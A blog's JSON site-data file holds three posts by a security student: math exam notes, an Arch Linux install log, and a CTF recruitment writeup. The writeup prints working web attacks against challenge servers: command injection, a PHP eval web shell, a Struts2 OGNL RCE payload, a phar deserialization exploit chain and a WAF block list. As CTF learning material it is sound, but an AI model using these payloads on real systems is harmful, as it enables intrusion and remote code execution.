{"meta":{"title":"Leon's blog😽","subtitle":"写些随笔","description":"想爱想吃想变成天上忽明忽暗的云","author":"Leon","url":"https://foreon.github.io","root":"/"},"pages":[{"title":"分类","date":"2023-11-02T05:06:39.000Z","updated":"2023-11-02T13:17:35.207Z","comments":true,"path":"categories/index.html","permalink":"https://foreon.github.io/categories/index.html","excerpt":"","text":""},{"title":"关于我","date":"2023-11-02T14:26:00.000Z","updated":"2023-11-02T14:38:28.527Z","comments":true,"path":"about/index.html","permalink":"https://foreon.github.io/about/index.html","excerpt":"","text":"介绍下自己我是UESTC网络空间安全专业的一名本科生，目前在学习ctf。以后会在这个博客更新一些自己的学习经历和总结，可能也会存一些期末复习笔记（ 希望能保持一颗不断学习的心🙏🙏🙏"},{"title":"categories","date":"2023-11-02T13:02:49.000Z","updated":"2023-11-02T13:02:49.852Z","comments":true,"path":"categories/index-1.html","permalink":"https://foreon.github.io/categories/index-1.html","excerpt":"","text":""},{"title":"tags","date":"2023-11-02T12:35:20.000Z","updated":"2023-11-02T12:35:20.326Z","comments":true,"path":"tags/index-1.html","permalink":"https://foreon.github.io/tags/index-1.html","excerpt":"","text":""},{"title":"相册","date":"2023-11-02T13:43:04.000Z","updated":"2023-11-02T14:38:56.014Z","comments":true,"path":"gallery/index.html","permalink":"https://foreon.github.io/gallery/index.html","excerpt":"","text":"施工中。。。"},{"title":"音乐","date":"2023-11-02T14:22:10.000Z","updated":"2023-11-02T14:39:24.010Z","comments":true,"path":"music/index.html","permalink":"https://foreon.github.io/music/index.html","excerpt":"","text":"施工中。。。"},{"title":"标签","date":"2023-11-02T05:07:08.000Z","updated":"2023-11-02T12:35:58.799Z","comments":true,"path":"tags/index.html","permalink":"https://foreon.github.io/tags/index.html","excerpt":"","text":""},{"title":"影视","date":"2023-11-02T14:22:29.000Z","updated":"2023-11-02T14:39:16.375Z","comments":true,"path":"movies/index.html","permalink":"https://foreon.github.io/movies/index.html","excerpt":"","text":"施工中。。。"},{"title":"友链","date":"2023-11-02T13:04:17.000Z","updated":"2023-11-02T13:52:42.568Z","comments":true,"path":"link/index.html","permalink":"https://foreon.github.io/link/index.html","excerpt":"","text":""},{"title":"留言板","date":"2023-11-02T13:04:09.000Z","updated":"2023-11-02T14:39:07.233Z","comments":true,"path":"messageboard/index.html","permalink":"https://foreon.github.io/messageboard/index.html","excerpt":"","text":"施工中。。。"},{"title":"日志","date":"2023-11-02T13:06:13.000Z","updated":"2023-11-02T13:07:24.429Z","comments":true,"path":"timeline/index.html","permalink":"https://foreon.github.io/timeline/index.html","excerpt":"","text":""},{"title":"Leon","date":"2023-11-02T13:07:38.000Z","updated":"2023-11-02T13:08:01.344Z","comments":true,"path":"myself/index.html","permalink":"https://foreon.github.io/myself/index.html","excerpt":"","text":""}],"posts":[{"title":"信息安全数学基础归纳","slug":"信息安全数学基础归纳","date":"2023-12-09T17:06:12.144Z","updated":"2023-12-09T17:12:31.827Z","comments":true,"path":"posts/43666.html","link":"","permalink":"https://foreon.github.io/posts/43666.html","excerpt":"","text":"前言期末在即，为了复习同时也为下学期的密码学打下基础，我把信息安全数学基础这门课归纳了一下，以供复习参考和记录。 多图预警！！！！ 所有内容来自许春香老师编著的《信息安全基础教程》 第一章 整除和同余 第二章 群 第三章 循环群与群的结构 群中元素的个数为群的阶，和元素的阶的概念不同，注意区分 要掌握“阶为素数的群一定为循环群”的证明 第四章 环 第六章 同余式 RSA 算法或许会考。。。。 掌握解密正确性的证明 例题看下这一题，巧用费马定理 第七章 平方剩余 第八章 原根和离散对数 Rabin密码体制和 ElGamal密码体制或许会考？？？还是了解即可吧","categories":[{"name":"专业课学习笔记","slug":"专业课学习笔记","permalink":"https://foreon.github.io/categories/%E4%B8%93%E4%B8%9A%E8%AF%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"大学课程学习","slug":"大学课程学习","permalink":"https://foreon.github.io/tags/%E5%A4%A7%E5%AD%A6%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/"}]},{"title":"CNSS Recruit 2023 Writeup","slug":"CNSS 2023 Recruit  Writeup","date":"2023-12-02T18:08:56.000Z","updated":"2023-12-03T02:48:32.662Z","comments":true,"path":"posts/16427.html","link":"","permalink":"https://foreon.github.io/posts/16427.html","excerpt":"","text":"CNSS Recruit 2023 WriteupWeb1.📗 CNSS 2023 Web Guideline没什么好说的 2.🙋 PHPinfo&#x2F;phpinfo()找到flag 3.🦴 babyHTTP按提示来就行 4.🏓 Pingping 127.0.0.1;ls &#x2F; # 找到flag ping 127.0.01;cat &#x2F;flag # 得到flag 5.🥇 我得再快点脚本如下 1234567891011121314151617181920212223242526272829303132import hashlibfrom hashlib import md5import requestss=requests.Session()url=&#x27;http://124.221.34.13:55590/&#x27;r=s.get(url)res=r.texta=res.find(&quot;&lt;p&gt;&quot;)b=res.find(&quot;/p&gt;&quot;,a)#找到我们要计算的式子的前后位置num=res[a+9:b-28]print(a)print(b)print(num)m = hashlib.md5()m.update(num.encode(&quot;utf-8&quot;))encodeStr = m.hexdigest()print (encodeStr)en=str.upper(encodeStr)print(en)playload=&#123; &#x27;value&#x27;:en&#125;r=s.get(url=url,params=playload)print(r.content)url2=&#x27;http://124.221.34.13:55590/check?value=&#x27;+encodeStrr2=s.get(url2)print(r2.text) 🐶 CNSS娘の宠物商店使用双等号绕过，原理： 密码输入’&#x3D;‘ 6.🥵 2048卡了一会，发现所有数据变化都在前端完成的，那么只要在前端做文章就行。看了一圈就改JavaScript吧(我之前还不知道JavaScript文件能在源代码界面修改并保存的 找到score的判定条件然后改成0保存，得到flag 7.👤 换个头像先发现只能上传图片，随便上传一个图片木马，然后burp抓包，把.png后缀改成.php，蚁剑连接 8.7️⃣ EZRCCCCE在tim大佬的提示下做出来了 过滤了一些东西，但是限制长度了 明显要用命令拼接来过题，注意这里的sandbox是给我们创建了一个私人路径，我就是卡在这一步了 playload: 1234567891011121314151617181920&gt;hp&gt;1.p\\\\&gt;d\\&gt;\\\\&gt;\\ -\\\\&gt;e64\\\\&gt;bas\\\\&gt;7\\|\\\\&gt;XSk\\\\&gt;Fsx\\\\&gt;dFV\\\\&gt;kX0\\\\&gt;bCg\\\\&gt;XZh\\\\&gt;AgZ\\\\&gt;waH\\\\&gt;PD9\\\\&gt;o\\ \\\\&gt;ech\\\\ls -t&gt;0sh 0 脚本： 1234567891011121314#!/usr/bin/python# -*- coding: UTF-8 -*-import requestsurl = &quot;http://124.221.34.13:55559/?6=&#123;0&#125;&quot;print(&quot;[+]start attack!!!&quot;)with open(&quot;payload.txt&quot;,&quot;r&quot;) as f: for i in f: print(&quot;[*]&quot; + url.format(i.strip())) s=requests.get(url.format(i.strip())) print((s.text))#检查是否攻击成功test = requests.get(&quot;http://124.221.34.13:55559/sandbox/5466482a195fb9b91138de0cb507f8bf/1.php&quot;)if test.status_code == requests.codes.ok: print(&quot;[*]Attack success!!!&quot;) 这里检查成功的路径要pwd查一下 然后ls &#x2F;看到flag把它cat出来，这里注意分号闭合语句 10.🐱 Tomcat?cat~猫猫可爱捏 这题考察struts2漏洞 参考csdn文章：CTFshow刷题日记-WEB-JAVA（web279-300）Struts2全漏洞复现，Java漏洞复现_debug&#x3D;command&amp;expression表达式注入漏洞如何修复_OceanSec的博客-CSDN博客 12POC:&#x27; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;cat webapps/flaaaaaaag/flag.jsp&#x27;).getInputStream())) + &#x27; 这题flag藏的有点深，一般在目录就看到了，问了大佬才做出来，一度以为方向错了😭 大佬说是struts2有点太简单了，藏深点上上难度 🔧 where is my unserialize?这题学到了不少，也踩了不少坑 首先file&#x3D;xxx.php是可以查原码的 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101class.php&lt;?phpclass CNSS&#123; public $shino; public $shin0; public $name; public function __construct($name) &#123; $this-&gt;name=$name; &#125; public function __wakeup() &#123; $this-&gt;shin0 = &#x27;cnss&#x27;; $this-&gt;_sayhello(); &#125; public function _sayhello() &#123; echo (&#x27;&lt;h1&gt;I know you are in a hurry, but don not rush yet.&lt;h1&gt;&#x27;); &#125; public function __destruct() &#123; $this-&gt;shin0 = $this-&gt;name; echo $this-&gt;shin0.&#x27;&lt;br&gt;&#x27;; &#125;&#125;class CN55&#123; public $source; public $params; public function __construct()&#123; $this-&gt;params = array(); &#125; public function __invoke() &#123; return $this-&gt;_get(&#x27;key&#x27;); &#125; public function _get($key) &#123; if(isset($this-&gt;params[$key])) &#123; $value = $this-&gt;params[$key]; &#125; else &#123; $value = &quot;index.php&quot;; &#125; return $this-&gt;file_get($value); &#125; public function file_get($value) &#123; $text = base64_encode(file_get_contents($value)); return $text; &#125;&#125;class Show&#123; public $key; public $haha; public function __construct($file) &#123; $this-&gt;key = $file; echo $this-&gt;key.&#x27;&lt;br&gt;&#x27;; &#125; public function __toString() &#123; $func = $this-&gt;haha[&#x27;hehe&#x27;]; return $func(); &#125; public function __call($key,$value) &#123; $this-&gt;$key = $value; &#125; public function _show() &#123; if(preg_match(&#x27;/http|https|file:|gopher|dict|\\.\\.|f1ag/i&#x27;,$this-&gt;source)) &#123; die(&#x27;&lt;h1&gt;hackerrrrrr!&lt;br&gt;join CNSS~&lt;h1&gt;&#x27;); &#125; else &#123; highlight_file($this-&gt;source); &#125; &#125; public function __wakeup() &#123; if(preg_match(&quot;/http|https|file:|gopher|dict|\\.\\./i&quot;, $this-&gt;source)) &#123; //Do you know &#x27;Php ARchive&#x27;? echo &quot;hacker~&quot;; $this-&gt;source = &quot;index.php&quot;; &#125; &#125;&#125;?&gt; 没有unserilize()，再加上上传文件，考察phar反序列化 原理： 这里先记录一下为什么第一次我没能成功 第一次的poc: 错在赋值不能以$cnss()的形式，因为都要赋值常数！！ 成功的POC: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;?phpclass CNSS&#123; public $shino; public $shin0; public $name;&#125;class CN55&#123; public $source; public $params; public function __invoke() &#123; &#125;&#125;class Show&#123; public $key; public $haha; public function __construct($file) &#123; $this-&gt;key = $file; echo $this-&gt;key.&#x27;&lt;br&gt;&#x27;; &#125; public function __toString() &#123; $func = $this-&gt;haha[&#x27;hehe&#x27;]; return $func(); &#125; public function __call($key,$value) &#123; $this-&gt;$key = $value; &#125;&#125;$cn=new CNSS(&#x27;cnss&#x27;);$cnss =new CN55();$s=new show(&#x27;6&#x27;);$s-&gt;haha[&#x27;hehe&#x27;]=$cnss;$cnss-&gt;params[&#x27;key&#x27;]=&#x27;/var/www/html/f1ag.php&#x27;;$cn-&gt;name=$s;$phar = new Phar(&quot;1.phar&quot;); $phar-&gt;startBuffering();$phar-&gt;setStub(&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;); $phar-&gt;setMetadata($cn); $phar-&gt;addFromString(&quot;leon.txt&quot;, &quot;leon&quot;); $phar-&gt;stopBuffering();?&gt; 拿到flag了 🚓 can can need shell在大佬的不断提示下整出来了，菜鸟成长全靠老师傅们😭 根据提示加&#x2F;admin 提示了账号密码都是admin 进入管理员后台，这题考察lavarel模板文件上传漏洞，找到下图的教程，原理是burp抓包jpg马，然后后缀加.php蚁剑连接，但是这题有waf waf: 12345678910111213141516public function waf($file)&#123; $dangerous = array(&#x27;eval&#x27;,&#x27;assert&#x27;,&#x27;serialize&#x27;,&#x27;link&#x27;,&#x27;open&#x27;,&#x27;write&#x27;,&#x27;_&#x27;,&#x27;get&#x27;,&#x27;post&#x27;,&#x27;passthru&#x27;,&#x27;system&#x27;,&#x27;exec&#x27;,&#x27;ch&#x27;,&#x27;scandir&#x27;,&quot;input&quot;,&quot;file&quot;,&quot;call&quot;,&quot;dl&quot;,&quot;syslog&quot;,&quot;putenv&quot;,&quot;[&quot;,&quot;]&quot;,&quot;`&quot;,&quot;*&quot;,&quot;+&quot;,&quot;|&quot;,&quot;url&quot;,&quot;flag&quot;,&quot;&#123;&quot;,&quot;&#125;&quot;,&quot;@&quot;,&quot;(&quot;,&quot;)&quot;); $handle = fopen($file-&gt;getRealPath(), &quot;r&quot;); while (($line = fgets($handle)) !== false) &#123; foreach($dangerous as $value)&#123; $res = stristr($line,$value); if($res != false)&#123; fclose($handle); return false; &#125; &#125; &#125; fclose($handle); return true; &#125; 禁了很多东西，没禁用单引号，在大佬的提示下考虑include文件包含 1234include.php&lt;?phpinclude &#x27;1.jpg&#x27;?&gt; 121.jpg &lt;?php @eval($_POST[&quot;leon&quot;]);?&gt; 都上传后，蚁剑连接 xxx&#x2F;xxxx&#x2F;include.php 就成了 9.🏭 EzPollution_pre这题注意nodejs容器使用一次就损坏了，所以在本地跑通，重启会方便一点 然后根据原型链污染的原理像图中这样post,注意要用js的函数把flag给cat出来 CNSS{v2ry_ea5y_N0dejs} Re1.📦 Bin Guideline无话可说 2.😍 那个女人打开就送 3.😢 我的flag碎了一地F5 根据提示打开String窗口 第二段在function找到 第三段右键查看引用图 找到func718 拼接一下CNSS{My_fl@g_h4s_br0ken_4parT_ Bu7_Y0u_c@n_f1x_1t!}","categories":[{"name":"writeup","slug":"writeup","permalink":"https://foreon.github.io/categories/writeup/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://foreon.github.io/tags/ctf/"}]},{"title":"安装Arch Linux的记录","slug":"安装Arch Linux的记录","date":"2023-12-02T18:03:57.000Z","updated":"2023-12-09T17:08:01.663Z","comments":true,"path":"posts/54882.html","link":"","permalink":"https://foreon.github.io/posts/54882.html","excerpt":"","text":"安装Arch Linux的记录第一次安装双系统，虽然是参考b站教程的，但还是很有成就感，故记录一下这个过程，顺便仔细学习一下各个命令的作用。 本文仅为学习记录，文末给出了参考来源，若有侵权请联系我删除🙏 安装过程准备工作 首先登录官网从国内镜像源下载arch linux系统镜像 下载rufus烧录arch linux镜像到U盘，默认设置就行 为arch linux分配磁盘空间，大概20G就够用 ​ 我这里能压缩的磁盘空间很少，但这个盘还剩很多空间，于是我使用了傲梅分区助手 设置网络重启进入bios,设置为从u盘启动，开始安装arch linux rfkill list查看列表 rfkill unblock wifi解除wifi锁定 ip link查看网卡，一般网卡名为wlan0 ip link set wlan0 up启用网卡 ip link set DEVICE { up | down | arp { on | off } | name NEWNAME | address LLADDR }选项说明：dev DEVICE：指定要操作的设备名up and down：启动或停用该设备arp on or arp off：启用或禁用该设备的arp协议name NAME：修改指定设备的名称，建议不要在该接口处于运行状态或已分配IP地址时重命名address LLADDRESS：设置指定接口的MAC地址 连接wifi 12345678910iwctl //在 Linux 中，&quot;ctl&quot; 通常代表 &quot;control&quot; 或 &quot;controller&quot;。例如，在 SysV 初始化系统中，/etc/init.d 目录下的脚本通常以 &quot;ctl&quot; 作为后缀，表示它们是用于控制系统服务的控制器。此外，在某些驱动程序中，CTL 可能代表 &quot;control&quot;，表示该驱动程序控制某个设备的操作。station wlan0 scan station wlan0 get-networks station wlan0 connect [wifi名字] //这里有个小技巧，如果遇到中文乱码，可以打出前面的非中文字符，再按下Tab匹配//接着输入密码exit ping baidu.com //检查网络是否正常 设置时间同步123timedatectl set-ntp true //开启ntp时间同步 timedatectl status 分配磁盘空间123fdisk -l //查看磁盘状态 fdisk /dev/nvme...n.... //nvme...n.... 由图为刚刚为arch linux分配空间的磁盘 1234567//p 查看布局//n 新建分区n7 //这里给出为linux的交换分区给出空间的磁盘的序号+4G //这里建立linux的交换分区，大小为4GBn//直接回车表示把剩余默认空间都给linux的根分区 UEFI是指主板的引导启动方式 GPT是硬盘的分区模式 EFI是GPT硬盘分区模式中的系统启动分区 EFI分区全称是EFI system partition，一般简写成EFI分区或者ESP分区 EFI分区是用来引导系统启动的 分配好的空间如图 分区格式化 创建好的分区必须格式化为一种文件系统，Linux 上常见的文件系统有 ext4，btrfs，xfs 等。建议第一次安装的读者使用 ext4 文件系统。btrfs 提供子卷、写时复制、压缩、快照等高级功能，适合更加熟练的用户。 mkfs命令 1234mkfs.btrfs /dev/nvme...n...1 //将根目录分区格式化为btrfs文件系统 mkswap /dev/nvme...n...2 //对交换分区进行操作，mkswap命令用于在一个文件或者设备上建立交换分区。在建立完之后要使用sawpon命令开始使用这个交换区。最后一个选择性参数指定了交换区的大小，但是这个参数是为了向后兼容设置的，没有使用的必要，一般都将整个文件或者设备作为交换区。swapon /dev/nvme...n...2 挂载分区 mount命令的功能是将文件系统挂载到目录 123456789fdisk -l mount /dev/nvme1n.... /mnt //将根分区挂载 mkdir /mnt/boot //根目录下生成文件夹boot mount dev/nvme0n.... /mnt/boot //将引导分区挂载到/mnt/boot下 //mnt - 此目录主要是作为挂载点使用。通常包括系统引导后被挂载的文件系统的挂载点。如挂载Windows下的某个分区。 最终的布局 从上到下分别是 引导分区、根分区、交换分区 Linux分区和挂载是Linux系统管理硬盘的两个重要概念。分区是将硬盘划分为不同的逻辑区域，以便存储不同类型的数据和文件。挂载是将一个分区与一个目录联系起来，使得该目录可以访问该分区中的数据和文件。linux为什么要挂载？ 如果硬盘是一片空地，那么分区和挂载就是把一片空地建成不同的房间（分区），每个房间存放不同类型的货物，再把房间的钥匙发给使用这个房间里的货物的人（挂载）。如果不挂载，那么人要使用某个货物时，就会因为没有钥匙而无法使用这个货物。为什么不直接访问&#x2F;dev目录？ 直接访问&#x2F;dev目录，就相当于把房间都拆了，直接从空地上寻找需要的货物，这不方便，也不安全（空地货物可能会被弄乱）Linux分区和挂载有以下几个用途：提高系统的安全性。没有挂载的分区是无法访问的，这样可以防止恶意用户或程序对系统造成破坏。提高系统的效率。通过合理地划分和挂载分区，可以减少系统维护文件的规模，提高磁盘空间的利用率和读写速度。适应多用户操作系统。Linux是一个多用户操作系统，不同用户可能有不同的权限和需求。通过分区和挂载，可以实现对用户空间、临时文件、日志文件等的隔离和管理。 选择软件镜像源123456nano /etc/pacman.d/mirrorlist //手动添加镜像 Server =https://mirrors.ustc.edu.cn/archlinux/$repo/os/$archServer =......//ctrl+x保存退出 在 Arch Linux 中，软件仓库就好比手机中的应用商店，软件包是通过软件仓库进行分发的。软件仓库镜像是软件仓库的复制品，同一个软件仓库可以在世界各地建立软件仓库镜像，以便于不同地区的用户下载。因此选择一个合适的软件仓库镜像对于您更新软件包数据库以及下载软件包的速度有很大影响。 pacman命令 nano编辑器 、 安装基础包 我们使用 pacstrap 安装 base，linux，linux-firmware 三个软件包，它们分别是基础包组，linux 内核和驱动程序。此外，如果您使用 2019 年及以后生产的笔记本电脑，可能需要安装 sof-firmware，否则可能没有声音[23]。 Arch linux 官方提供了 linux，linux-lts，linux-zen，linux-hardened 内核[24]，但是对于初学者，只推荐使用 linux 内核。 123pacstrap -K /mnt base base-devel linux linux-firmware sudo nano vim networkmanager intel-ucode//安装base,base-devel,linux,linux-firmware,sudo,nano,vim,networkmanager,intel-ucode//intel-ucode是CPU微码，用于intel的cpu固件更新？？？这里我不确定( 123pacman -Sy archlinux-keyring //如若报错则需更新keyring pacstrap -K /mnt base base-devel linux linux-firmware sudo nano vim networkmanager intel-ucode //然后重新安装 fstab是一个系统文件，决定了系统启动时如何自动挂载分区。没有 fstab，系统将找不到根分区，从而无法启动。fstab 有一定的格式，我们用一个例子说明 fstab 文件的格式。 1genfstab -U/mnt &gt;&gt; /mnt/ect/fstab 其中“genfstab -U &#x2F;mnt”是以 UUID 的描述方式生成 fstab，“&gt;&gt;” 的意思是，将输出结果附加在后面的文件之后。 生成完成后，记得使用 cat 命令打印文件内容，仔细检查一遍。 1cat /mnt/etc/fstab 使用chroot使用chroot切换到安装的新系统 1arch-chroot /mnt 这里我顿悟了，之前的根目录在&#x2F;mnt下，这里chroot直接把根目录移动回系统&#x2F;下，&#x2F;mnt相当于完成汉诺塔的倒数第二步 chroot命令 设置时区123ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime //设置上海时间 hwclock --systohc //设置硬件时间 ln命令 hwclock命令 本地化 我们将设置 locale、终端键盘布局和字体。locale 决定了系统的语言和格式，包括终端显示哪种语言，数字、时间和货币以哪国的格式显示等等。 123nano /etc/locale.gen//取消en_US.UTF-8 和zh_CN.UTF-8前的注释locale-gen //生成locale 12nano /etc/locale.conf //修改locale.conf文件//输入LANG=en_US.UTF-8，ctrl+x保存 确定系统名和网络管理系统配置1234nano /etc/hostname//输入archlinux，确定系统名systemctl enable NetworkManager//注意大小写//使用 systemd 设置 NetworkManager 开机自动启动 设置root密码 root 用户是 Linux 系统中权限最高的用户，有些敏感的操作必须通过 root 用户进行，比如使用 pacman。我们之前进行所有的操作也都是以 root 用户进行的。也正是因为 root 的权限过高，如果使用不当会造成安全问题，所以我们在下一篇文章中会新建一个普通用户来进行日常的操作。在这里我们需要为 root 用户设置一个密码。 123passwd//输入密码，这里不会显示已经输入的密码//再次输入密码 新建普通用户1234useradd -m -G wheel -s /bin/bash [username] //将用户添加到wheel组，root也在wheel组 passwd [username]//输入密码并重复输入确定 123visudo //打开/etc/sudoers文件进行编辑设置sudo//这里使用传统vim编辑器，按i进入编辑模式，按esc退出编辑模式，输入:wq退出保存//取消%wheel ALL前的注释 这里的意思是让wheel组下的所有用户都能免去输入密码使用sudo权限 sudo权限 Grub安装 GRUB 是什么？GRUB 是一个用于加载和管理系统启动的完整程序。它是 Linux 发行版中最常见的*引导程序(bootloader)*。引导程序是计算机启动时运行的第一个软件。它加载 操作系统的内核，然后再由内核初始化操作系统的其他部分（包括 Shell、显示管理器、桌面环境 等等）。 123pacman -S grub efibootmgr os-prober //安装系统探测器 nano /etc/default/grub 新版grub默认禁用os-prober,需要手动启用 去掉GRUB_DISABLE前面的注释 123grub-install --target=x86_64-efi --efi-directory=/boot --bootloader-id=GRUB //安装Grub grub-mkconfig -o /boot/grub/grub.cfg //生成Grub配置 手动添加Windows启动项1blkid /dev/nvme0n...... //查看引导分区信息 blkid命令 记录下UUID后面的数字 1nano/boot/grub/grub.cfg 有概率os-prober无法探测到windows,需要手动添加windows启动项 输入红框中的内容，红圈中的内容为刚刚记下来的数字 12345exit //保存后退出 umount -R /mnt // /mnt完成了它的使命，把它卸载掉 reboot //重启查看能否正常启动Windows 进入Arch Linux美化1root //输入密码登录root账户 重复之前的联网操作 1234567891011121314151617rfkill unblock wifiip linkip link set wlan0 upiwctl station wlan0 scanstation wlan0 get-networksstation wlan0 connect [wifi名字]exitping baidu.com 安装Gnome桌面 GNOME是一个自由开源的桌面环境，是 Linux 操作系统中最常用的桌面环境之一。 GNOME的目标是为 Linux 系统提供现代、易用的桌面环境，以提高用户的体验和生产力。 它提供了一个用户友好的界面和许多常用的应用程序，如文件管理器、文本编辑器、终端、图形 图像处理 程序 1pacman -S gnome gnome-tweaks //然后一路回车 安装相应的显卡驱动注意这里只要安装集显驱动而不要安装英伟达驱动，原因是arch linux可能检测不到 1pacman -S mesa xf86-video-b 1systemctl enable gdm GDM (The GNOME Display Manager)是GNOME显示环境的管理器，并被用来替代原来的X Display Manager 1reboot 于是就进入gnome桌面了 下载软件下载fcirx输入法、浏览器等必要软件 1sudo pacman -S git ntfs-3g wqy-zenhei firefox fcitx5-im fcitx5-chinese-addons &#x2F;etc&#x2F;environment是设置整个系统的环境，而&#x2F;etc&#x2F;profile是设置所有用户的环境，前者与登录用户无关，后者与登录用户有关。 1sudo nano /etc/environment 输入： 123456789GTK_IM_MODULE=fcitxQT_IM_MODULE=fcitxXMODIFIERS=@im=fcitxSDL_IM_MODULE=fcitxGLFW_IM_MODULE=ibus 1reboot 设置中文输入法 注意这个输入法是用ctrl+空格启用的 设置蓝牙连接安装蓝牙模块并启动蓝牙服务 123sudo pacman -S bluez bluez-utilssudo systemctl enable bluetooth.servicesudo systemctl start bluetooth.service Bluez是Linux系统上的蓝牙协议栈，自带了很多有用的工具，Bluetoothctl就是其一 12bluetoothctl --help 查看帮助命令bluetoothctl -v 查看蓝牙版本 12345678bluetoothctl 进入蓝牙管理工具环境[bluetooth]# power on 打开蓝牙[bluetooth]# agent on 开启代理[bluetooth]# scan on 扫描蓝牙设备[bluetooth]# pair xx:xx:xx:... 配对该设备[bluetooth]# trust xx:xx:xx:... 信任该设备[bluetooth]# connect xx:xx:... 连接该设备[bluetooth]# disconnect xx:xx:... 断开蓝牙 安装蓝牙音频 1sudo pacman -S pulseaudio-bluetooth 蓝牙图形化管理工具安装 1sudo pacman -S bluedevil 或 1sudo pacman -S blueman 完结撒花🌸Linux 系统结构 &#x2F;bin：bin 是 Binaries (二进制文件) 的缩写, 这个目录存放着最经常使用的命令。 &#x2F;boot：这里存放的是启动 Linux 时使用的一些核心文件，包括一些连接文件以及镜像文件。 &#x2F;dev ：dev 是 Device(设备) 的缩写, 该目录下存放的是 Linux 的外部设备，在 Linux 中访问设备的方式和访问文件的方式是相同的。 &#x2F;etc：etc 是 Etcetera(等等) 的缩写,这个目录用来存放所有的系统管理所需要的配置文件和子目录。 &#x2F;home：用户的主目录，在 Linux 中，每个用户都有一个自己的目录，一般该目录名是以用户的账号命名的，如上图中的 alice、bob 和 eve。 &#x2F;lib：lib 是 Library(库) 的缩写这个目录里存放着系统最基本的动态连接共享库，其作用类似于 Windows 里的 DLL 文件。几乎所有的应用程序都需要用到这些共享库。 &#x2F;lost+found：这个目录一般情况下是空的，当系统非法关机后，这里就存放了一些文件。 &#x2F;media：linux 系统会自动识别一些设备，例如U盘、光驱等等，当识别后，Linux 会把识别的设备挂载到这个目录下。 &#x2F;mnt：系统提供该目录是为了让用户临时挂载别的文件系统的，我们可以将光驱挂载在 &#x2F;mnt&#x2F; 上，然后进入该目录就可以查看光驱里的内容了。 &#x2F;opt：opt 是 optional(可选) 的缩写，这是给主机额外安装软件所摆放的目录。比如你安装一个ORACLE数据库则就可以放到这个目录下。默认是空的。 &#x2F;proc：proc 是 Processes(进程) 的缩写，&#x2F;proc 是一种伪文件系统（也即虚拟文件系统），存储的是当前内核运行状态的一系列特殊文件，这个目录是一个虚拟的目录，它是系统内存的映射，我们可以通过直接访问这个目录来获取系统信息。这个目录的内容不在硬盘上而是在内存里，我们也可以直接修改里面的某些文件，比如可以通过下面的命令来屏蔽主机的ping命令，使别人无法ping你的机器： 1echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all &#x2F;root：该目录为系统管理员，也称作超级权限者的用户主目录。 &#x2F;sbin：s 就是 Super User 的意思，是 Superuser Binaries (超级用户的二进制文件) 的缩写，这里存放的是系统管理员使用的系统管理程序。 &#x2F;selinux： 这个目录是 Redhat&#x2F;CentOS 所特有的目录，Selinux 是一个安全机制，类似于 windows 的防火墙，但是这套机制比较复杂，这个目录就是存放selinux相关的文件的。 &#x2F;srv： 该目录存放一些服务启动之后需要提取的数据。 &#x2F;sys： 这是 Linux2.6 内核的一个很大的变化。该目录下安装了 2.6 内核中新出现的一个文件系统 sysfs 。 sysfs 文件系统集成了下面3种文件系统的信息：针对进程信息的 proc 文件系统、针对设备的 devfs 文件系统以及针对伪终端的 devpts 文件系统。 该文件系统是内核设备树的一个直观反映。 当一个内核对象被创建的时候，对应的文件和目录也在内核对象子系统中被创建。 &#x2F;tmp：tmp 是 temporary(临时) 的缩写这个目录是用来存放一些临时文件的。 &#x2F;usr： usr 是 unix shared resources(共享资源) 的缩写，这是一个非常重要的目录，用户的很多应用程序和文件都放在这个目录下，类似于 windows 下的 program files 目录。 &#x2F;usr&#x2F;bin：系统用户使用的应用程序。 &#x2F;usr&#x2F;sbin：超级用户使用的比较高级的管理程序和系统守护程序。 &#x2F;usr&#x2F;src：内核源代码默认的放置目录。 &#x2F;var：var 是 variable(变量) 的缩写，这个目录中存放着在不断扩充着的东西，我们习惯将那些经常被修改的目录放在这个目录下。包括各种日志文件。 &#x2F;run：是一个临时文件系统，存储系统启动以来的信息。当系统重启时，这个目录下的文件应该被删掉或清除。如果你的系统上有 &#x2F;var&#x2F;run 目录，应该让它指向 run。 在 Linux 系统中，有几个目录是比较重要的，平时需要注意不要误删除或者随意更改内部文件。 &#x2F;etc： 上边也提到了，这个是系统中的配置文件，如果你更改了该目录下的某个文件可能会导致系统不能启动。 &#x2F;bin, &#x2F;sbin, &#x2F;usr&#x2F;bin, &#x2F;usr&#x2F;sbin: 这是系统预设的执行文件的放置目录，比如 ls 就是在 &#x2F;bin&#x2F;ls 目录下的。 值得提出的是 &#x2F;bin、**&#x2F;usr&#x2F;bin** 是给系统用户使用的指令（除 root 外的通用用户），而&#x2F;sbin, &#x2F;usr&#x2F;sbin 则是给 root 使用的指令。 &#x2F;var： 这是一个非常重要的目录，系统上跑了很多程序，那么每个程序都会有相应的日志产生，而这些日志就被记录到这个目录下，具体在 &#x2F;var&#x2F;log 目录下，另外 mail 的预设放置也是在这里。 参考 本文参考： ip link 命令总结-CSDN博客 Linux命令大全(手册) – 真正好用的Linux命令在线查询网站 (linuxcool.com) linux中ctl代表什么缩写？很多命令都带结尾ctl，另外ifconfig和nmcli有什么区别？ - 知乎 (zhihu.com) Arch Linux 详细安装教程，萌新再也不怕了！「2023.10」 - 知乎 (zhihu.com) 【超简单】Windows+Arch Linux双系统双磁盘方案，全程不废话_哔哩哔哩_bilibili Linux—带你区分”根目录” 和 “家目录”_根目录、家目录的路径分别是什么?可以用什么符号表示,用来快速访问?-CSDN博客 https://blog.csdn.net/qq_61683908/article/details/129430286 linux下的mnt文件夹用来干嘛,Linux&#x2F;mnt目录主要用于什么？_Killer Seven的博客-CSDN博客 ArchWiki (archlinux.org) Linux 黑话解释：Linux 中的 GRUB 是什么？ | Linux 中国 - 知乎 (zhihu.com) 